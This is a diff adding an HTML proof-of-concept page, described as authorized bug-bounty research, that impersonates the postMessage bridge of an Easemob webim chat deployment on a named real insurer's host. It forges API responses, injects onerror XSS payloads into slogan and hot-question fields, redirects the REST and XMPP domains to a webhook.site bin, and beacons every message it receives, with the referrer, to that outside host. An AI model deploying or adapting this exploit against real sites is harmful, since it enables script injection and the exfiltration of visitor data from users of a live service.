@@ -1,0 +1,62 @@
+﻿<!doctype html>
+<!--
+  Security research PoC - fake "transfer bridge" page for Easemob webim private deployments.
+  Purpose: demonstrate that kefu.cpic.com.cn/webim/im.html takes the cross-origin bridge
+  iframe target from the `domain` URL parameter without any allowlist, so an attacker-hosted
+  bridge replaces the real one. This page answers the bridge postMessage protocol with
+  harmless marker payloads (window.__xss=1 style flags only - no data theft, no worms).
+  All received API calls are beaconed to a researcher-owned webhook.site request bin as evidence.
+  Lane: 0909-cpic-fe-b238-misc (crowdrace). Authorized bug-bounty testing only.
+-->
+<html><head><meta charset="utf-8"><title>poc-bridge</title></head><body>
+<script>
+(function(){
+  var WHOOK = 'https://webhook.site/2f46c8b8-f0fd-40a4-9f77-e143d6faaa34';
+  var NOTICE = '<img src=x onerror="window.__xss=1">';
+  var HOTQ   = '<img src=y onerror="window.__hotq=1">';
+
+  function beacon(kind, payload){
+    try {
+      fetch(WHOOK + '/bridge-log/' + kind, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({kind: kind, payload: payload, t: Date.now()})
+      }).catch(function(){});
+    } catch(e){}
+  }
+  beacon('load', {referrer: document.referrer, href: location.href});
+
+  function resp(api){
+    switch(api){
+      case 'getRelevanceList': return [{orgName:"pocorg",appName:"pocapp",imServiceNumber:"10001",tenantId:2,tenantName:"POC-Tenant",tenantAvatar:"",tenantLogo:"",channelId:"poc-channel",restDomain:"webhook.site/2f46c8b8-f0fd-40a4-9f77-e143d6faaa34",xmppServer:"webhook.site/2f46c8b8-f0fd-40a4-9f77-e143d6faaa34"}];
+      case 'getmapping': return {entity:{}};
+      case 'grayScale': return {entities:[]};
+      case 'getSlogan': return [{optionValue:NOTICE}];
+      case 'getTheme': return [{optionValue:"default"}];
+      case 'getSystemGreeting': return "";
+      case 'getCustomEmojiPackages': return {status:"OK",entities:[]};
+      case 'getDutyStatus_2': return {status:"OK",entity:null};
+      case 'timeOffDuty': return {};
+      case 'createVisitor': return {userId:"pocvisitor001",userPassword:"pocpass001"};
+      case 'getPassword2': return {status:"OK",entity:{userPassword:"pocpass001"}};
+      case 'getVisitorInfo_2': return {entity:{userId:"pocvisitor001",id:"pocvisitor001",ht:"JT2018RLZYPC"}};
+      case 'isWhiltelist': return true;
+      case 'getRobertIsOpen': return {entity:false};
+      case 'getNickNameOption': return {status:"OK",optionValue:"POC-Agent"};
+      case 'getHotQuestions': return {data:{itemList:[{intent:HOTQ,intentId:"q1"}]}};
+      case 'getArticleJson': return {status:"OK"};
+      default: return {status:"OK"};
+    }
+  }
+
+  window.addEventListener('message', function(e){
+    var m = e.data;
+    if (typeof m === 'string') { try { m = JSON.parse(m); } catch(err){ return; } }
+    if (!m || typeof m !== 'object') return;
+    if (!m.api) { beacon('nonapi', m); return; }
+    beacon('api-recvd', {api: m.api, data: m.data, timespan: m.timespan, useObject: m.useObject});
+    var out = {call: m.api, timespan: m.timespan, status: 0, data: resp(m.api), statusCode: 200, useObject: true, key: 'api', origin: 'https://kefu.cpic.com.cn'};
+    window.parent.postMessage(out, '*');
+  }, false);
+})();
+</script></body></html>
